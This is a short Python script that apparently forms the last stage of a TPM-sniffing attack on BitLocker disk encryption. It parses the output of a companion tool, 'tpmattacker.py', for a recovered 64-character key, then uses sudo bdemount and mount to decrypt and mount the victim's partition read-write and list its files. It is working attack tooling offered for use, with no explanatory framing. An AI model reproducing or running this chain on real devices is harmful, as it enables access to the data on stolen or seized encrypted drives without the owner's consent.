
import subprocess
import argparse

if __name__ == '__main__':
	"""
	
	"""

	# init command line parser
	parser = argparse.ArgumentParser("./nameofscript.py")
	parser.add_argument('-f', '--file', type=str, required=True,
						help='This program requires the attack results from tpmattacker.py. Default name is = sniffing_results.txt')
	parser.add_argument('-d', '--drive', type=str, required=True,
						help='The Bitlocker encrypted partition. Usually located in /dev and has the identifier sdxy where x is a letter and y a number.')

	args = parser.parse_args()
	key = ""
	found = False

	print("[+] Attempting to mount the encrypted drive: %s" % args.drive)

	with open(args.file, 'r') as f:
		for line in f:
			if "Decrypted" in line:
				found = True
				continue
			if found :
				key = line[:64]
				break

	if not found:
		print("[+] Provided file does not contain the key required. Did you supply the correct file?")

	else:
		drive = args.drive
		subprocess.run(['sudo', 'bdemount', '-k', key, drive, "/mnt/bitlocker"], stdout=subprocess.PIPE)

		subprocess.run(['sudo', 'mount', '-o', "rw", "/mnt/bitlocker/bde1", "/mnt/ntfs"], stdout=subprocess.PIPE)

		subprocess.call('ls /mnt/ntfs/', shell=True)
